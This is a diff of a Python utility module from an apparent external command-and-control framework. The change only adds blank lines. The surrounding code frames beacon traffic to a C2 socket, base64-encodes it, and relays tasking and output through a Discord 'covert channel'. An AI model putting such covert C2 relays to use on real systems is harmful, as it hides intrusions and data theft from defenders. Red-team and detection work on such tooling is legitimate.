@@ -4,6 +4,7 @@ import config
 from encoders import encoder_base64
 from transports import transport_discord
 
+
 def importModule(modName, modType):
     """
     Imports a passed module as either an 'encoder' or a 'transport'; called with either encoder.X() or transport.X()
@@ -13,6 +14,7 @@ def importModule(modName, modType):
     importName = "import utils." + modType + "s." + modName + " as " + modType
     exec(importName, globals())
 
+
 def createSocket():
     # Borrowed from https://github.com/outflanknl/external_c2/blob/master/python_c2ex.py
     d = {}
@@ -20,9 +22,11 @@ def createSocket():
     d['state'] = 1
     return (d['sock'])
 
+
 def sendFrameToC2(sock, chunk):
     slen = struct.pack('<I', len(chunk))
     sock.sendall(slen + chunk)
+
 
 def recvFrameFromC2(sock):
     try:
@@ -37,18 +41,22 @@ def recvFrameFromC2(sock):
         chunk = chunk + sock.recv(slen - len(chunk))
     return(chunk)
 
+
 def killSocket(sock):
     sock.close()
+
 
 def prepData(data):
     # This will prepare whatever data is given based on the config
     rdyData = encoder_base64.encode(data)
     return rdyData
 
+
 def decodeData(data):
     # This will decode whatever data is given based on the config
     rdyData = encoder_base64.decode(data)
     return rdyData
+
 
 def retrieveData(beaconId):
     # This will retrieve data via the covert channel
@@ -65,6 +73,7 @@ def retrieveData(beaconId):
 
     return taskData
 
+
 def sendData(data, beaconId):
     # This will upload the data via the covert channel
     # returns a confirmation that the data has been sent
@@ -76,6 +85,7 @@ def sendData(data, beaconId):
     preped_data = prepData(data)
 
     transport_discord.sendData(preped_data, beaconId)
+
 
 def color(string, status=True, warning=False, bold=True, yellow=False):
     """
@@ -98,6 +108,7 @@ def color(string, status=True, warning=False, bold=True, yellow=False):
         attr.append('33')
     return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
 
+
 def notifySessionExit(beaconId):
     """
     Notify the C2 controller about the session exit for the given beacon ID.
@@ -105,6 +116,7 @@ def notifySessionExit(beaconId):
     """
     exit_message = f"Session with beacon ID {beaconId} has exited."
     sendData(exit_message, beaconId)
+
 
 # Example usage in a session management context
 def manageSession(beaconId):
